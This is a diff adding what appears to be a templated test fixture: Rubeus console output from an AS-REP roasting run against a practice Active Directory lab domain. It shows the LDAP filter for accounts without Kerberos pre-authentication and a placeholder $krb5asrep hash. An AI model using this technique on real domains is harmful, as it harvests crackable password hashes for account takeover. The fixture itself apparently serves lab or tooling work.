@@ -1,0 +1,23 @@
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  <VERSION>
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : sevenkingdoms.local
+
+[*] Searching path 'LDAP://kingslanding.sevenkingdoms.local/DC=sevenkingdoms,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+[*] SamAccountName         : wf-noPreauth
+[*] DistinguishedName      : CN=wf-noPreauth,CN=Users,DC=sevenkingdoms,DC=local
+[*] Using domain controller: kingslanding.sevenkingdoms.local (10.3.10.10)
+[*] Building AS-REQ (w/o preauth) for: 'sevenkingdoms.local\wf-noPreauth'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$wf-noPreauth@sevenkingdoms.local:<KEY32>$<KIRBI>
+
